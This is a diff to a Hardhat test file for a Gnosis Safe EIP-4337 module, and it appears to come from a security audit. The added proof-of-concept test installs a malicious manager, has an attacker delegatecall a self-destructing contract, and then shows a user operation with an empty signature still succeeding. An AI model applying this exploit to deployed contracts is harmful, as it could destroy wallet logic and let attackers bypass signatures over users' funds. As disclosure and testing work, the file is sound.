@@ -88,15 +88,48 @@ describe('Gnosis Proxy', function () {
     beneficiary = createAddress()
   })
 
-  it.only('PoC : selfdestruct', async function(){
-    const malicious = await(await ethers.getContractFactory("MaliciousEIP4337Manager")).deploy();
-    const attacker = (await ethers.getSigners())[10];
-    const destructor = await(await ethers.getContractFactory("Destructor")).deploy();
-    await malicious.set(attacker.address, attacker.address);
-    await manager.setup4337Modules(malicious.address);
-    await manager.connect(attacker).execTransactionFromModule(destructor.address, 0, "0x", 1);
-    expect(await ethers.provider.getCode(manager.address)).to.be.equal("0x");
-  })
+  describe.only('PoC : selfdestruct', function(){
+    it('test if tx fails when not destroyed', async function(){
+      const op = await fillAndSign({
+        sender: proxy.address,
+        callGasLimit: 1e6,
+        callData: safe_execTxCallData
+      }, owner, entryPoint);
+      op.signature = "0x";
+      await entryPoint.depositTo(proxy.address, {value : "1000000000000000000"});
+      const rcpt = await entryPoint.handleOps([op], beneficiary).then(async r => r.wait())
+      console.log('gasUsed=', rcpt.gasUsed, rcpt.transactionHash)
+      // check if tx have been succeeded
+      const ev = rcpt.events!.find(ev => ev.event === 'UserOperationEvent')!
+        expect(ev.args!.success).to.eq(true)
+      expect(await getBalance(beneficiary)).to.eq(ev.args!.actualGasCost)
+    });
+    it('PoC : selfdestruct', async function(){
+      const malicious = await(await ethers.getContractFactory("MaliciousEIP4337Manager")).deploy();
+      const attacker = (await ethers.getSigners())[10];
+      const destructor = await(await ethers.getContractFactory("Destructor")).deploy();
+      await malicious.set(attacker.address, attacker.address);
+      await manager.setup4337Modules(malicious.address);
+      await manager.connect(attacker).execTransactionFromModule(destructor.address, 0, "0x", 1);
+      expect(await ethers.provider.getCode(manager.address)).to.be.equal("0x");
+      // implementation contract is now destroyed
+      // check for the impacts
+      // handleOps with invalid signature
+      const op = await fillAndSign({
+        sender: proxy.address,
+        callGasLimit: 1e6,
+        callData: safe_execTxCallData
+      }, owner, entryPoint);
+      op.signature = "0x";
+      await entryPoint.depositTo(proxy.address, {value : "1000000000000000000"});
+      const rcpt = await entryPoint.handleOps([op], beneficiary).then(async r => r.wait())
+      console.log('gasUsed=', rcpt.gasUsed, rcpt.transactionHash)
+      // check if tx have been succeeded
+      const ev = rcpt.events!.find(ev => ev.event === 'UserOperationEvent')!
+        expect(ev.args!.success).to.eq(true)
+      expect(await getBalance(beneficiary)).to.eq(ev.args!.actualGasCost)
+    })
+  });
 
   it('should validate', async function () {
     await manager.callStatic.validateEip4337(proxySafe.address, manager.address, { gasLimit: 10e6 })
